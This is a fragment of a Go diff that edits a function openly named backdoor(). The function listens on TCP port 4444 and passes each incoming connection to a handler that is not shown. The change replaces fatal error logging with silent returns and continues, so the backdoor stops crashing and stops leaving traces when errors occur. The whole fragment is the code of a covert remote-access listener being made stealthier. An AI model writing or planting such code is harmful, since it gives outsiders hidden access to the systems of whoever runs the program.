@@ -15,13 +15,13 @@ func main() {
 func backdoor() {
 	ln, err := net.Listen("tcp", ":4444")
 	if err != nil {
-		log.Fatalln(err)
+		return
 	}
 
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			log.Fatalln(err)
+			continue
 		}
 
 		go handleConnection(conn)
